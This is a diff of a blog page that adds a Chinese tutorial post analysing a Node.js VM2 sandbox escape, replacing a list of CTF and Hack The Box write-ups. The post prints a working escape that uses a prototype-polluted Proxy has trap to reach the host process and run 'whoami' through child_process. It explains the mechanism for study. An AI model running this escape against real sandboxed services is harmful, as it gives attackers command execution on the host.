@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">0xGeekCat</title>
+  <title itemprop="name">学习Node.js VM2 sandbox escapse | 0xGeekCat</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -267,438 +267,142 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 0px;"></div>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
 <div id="content" class="site-content">
-  
-  <div class="notice" style="margin-top:60px">
-    <i class="iconfont icon-notification">
-    </i>
-    <div class="notice-content">目前疯狂看书学习node</div>
-  </div>
-  
-  <div class="top-feature-row">
-  <h1 class="fes-title" style="font-family: 'Ubuntu', sans-serif;">
-  <i class="fa fa-anchor" aria-hidden="true">
-  </i>
-  摩西摩西~</h1>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20-%20281059%202girls%20aeolian_(wlop)%20bikini%20black_hair%20ghostblade%20red_hair%20sketch%20swimsuit%20tagme_(character)%20thighhighs%20weapon%20wlop.jpg">
-        </div>
-        <div class="info">
-          <h3>功能未开发</h3>
-          <p>啦啦啦~</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="https://space.bilibili.com/381776247" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/startdash/bilibili.jpg">
-        </div>
-        <div class="info">
-          <h3>Bilibili</h3>
-          <p>我的b站视频</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-  <div class="top-feature-v2">
-    <div class="the-feature square from_left_and_right">
-      <a href="/" target="_blank">
-        <div class="img">
-          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/p1.jpg">
-        </div>
-        <div class="info">
-          <h3>功能未开发</h3>
-          <p>啦啦啦~</p>
-        </div>
-      </a>
-    </div>
-  </div>
-  
-</div>
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
-      <h1 class="main-title" style="font-family: 'Ubuntu', sans-serif;">
-      <i class="fa fa-envira" aria-hidden="true"></i>
-      文章</h1>
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">学习Node.js VM2 sandbox escapse</h1>
+            <p class="entry-census">0xGeekCat&nbsp;·&nbsp;2020-9-15&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VM2中在版本的更迭中存在多种逃逸方法，可以参考<a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed" target="_blank" rel="noopener">issues</a>但是其中没有给出具体的分析，👇会通过几个典型的案例来分析这些代码是如何逃逸VM2沙箱的</p>
+<p>在学习本文前需要先简单了解<a href="https://0xgeekcat.github.io/%E5%AD%A6%E4%B9%A0ES6%E5%8E%9F%E7%94%9FProxy%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0.html#Proxy%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">proxy构造函数</a></p>
+<h1 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h1><pre><code class="javascript">&quot;use strict&quot;;
+const {VM} = require(&#39;vm2&#39;);
+const untrusted = `var process;
+Object.prototype.has=(t,k)=&gt;{
+    process = t.constructor(&quot;return process&quot;)();
+}
+&quot;&quot; in Buffer.from;
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()`
+try{
+    console.log(new VM().run(untrusted));
+}catch(x){
+    console.log(x);
+}</code></pre>
+<p><strong>在了解案例之前先了解👇的代码</strong></p>
+<pre><code class="javascript">var proxy = new Proxy({}, {
+    get: () =&gt; console.log(&#39;get trap&#39;)
+})
+
+Object.prototype.has = function () { 👈 将has定义在原型链上
+    console.log(&#39;has trap&#39;)
+}
+
+proxy.a → get trap
+&#39;&#39; in proxy → has trap</code></pre>
+<p>在空对象 <code>target</code> 上定义 <code>get</code> 陷阱会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get trap</code></p>
+<p>当执行<code>&#39;&#39; in proxy</code>时会被<code>has</code>陷阱拦截，此时虽然没有直接在<code>target</code>对象上定义<code>has</code>拦截操作，但<code>handler</code>继承自<code>Object.prototype</code></p>
+<p><strong>回到VM2逃逸的代码，👇VM2中实际运行的代码</strong></p>
+<pre><code class="javascript">&quot;use strict&quot;;
+
+var process;
+
+Object.prototype.has = function (t, k) {
+    process = t.constructor(&quot;return process&quot;)();
+};
+
+&quot;&quot; in Buffer.from;
+process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/wechat.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/%E5%AD%A6%E4%B9%A0ES6%E5%8E%9F%E7%94%9FProxy%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0.html" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                学习ES6原生Proxy构造函数</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-  <div class="post-thumb">
-    <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Arctic.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/hackthebox.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-5 12:08</div>
-      <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Arctic.html" class="post-title">
-        <h3>萌新学渗透之Hack The Box_Arctic</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Hack-The-Box/">Hack The Box</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Arctic.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://0xgeekcat.github.io/" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg" itemprop="image" alt="0xGeekCat" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://0xgeekcat.github.io/" itemprop="url" rel="author">0xGeekCat</a>
+            </h3>
+          </div>
         </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Beep.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/hackthebox.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 17:08</div>
-      <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Beep.html" class="post-title">
-        <h3>萌新学渗透系列之Hack The Box_Beep</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Hack-The-Box/">Hack The Box</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Beep.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Devel.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/hackthebox.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 17:08</div>
-      <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Devel.html" class="post-title">
-        <h3>萌新学渗透系列之Hack The Box_Devel</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Hack-The-Box/">Hack The Box</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Devel.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Legacy.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/hackthebox.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 16:08</div>
-      <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Legacy.html" class="post-title">
-        <h3>萌新学渗透系列之Hack The Box_Legacy</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Hack-The-Box/">Hack The Box</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Legacy.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Lame.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/hackthebox.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 16:08</div>
-      <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Lame.html" class="post-title">
-        <h3>萌新学渗透系列之Hack The Box_Lame</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Hack-The-Box/">Hack The Box</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E8%90%8C%E6%96%B0%E5%AD%A6%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97%E4%B9%8BHack-The-Box-Lame.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://raw.githubusercontent.com/0xGeekCat/cdn/master/photos/mysql.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 16:08</div>
-      <a href="/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html" class="post-title">
-        <h3>利用MySQL8新特性绕过select过滤</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">奇技淫巧</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 15:08</div>
-      <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86.html" class="post-title">
-        <h3>BuuCTF Web writeup 第三部分</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/CTF/">CTF</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 15:08</div>
-      <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.html" class="post-title">
-        <h3>BuuCTF Web writeup 第二部分</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/CTF/">CTF</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.html">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-8-3 15:08</div>
-      <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.html" class="post-title">
-        <h3>BuuCTF Web writeup 第一部分</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/CTF/">CTF</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
-        <div class="post-bottom">
-          <a href="/BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86.html" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <a class="extend prev" rel="prev" href="/page/4/">&lt;i class&#x3D;&quot;iconfont icon-back&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
-      </nav>
-     -->
-  </div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
 
-<script src="https://cdn.jsdelivr.net/gh/yremp/yremp-js@1.5/sakura.js"></script>
 
 
     </div>    
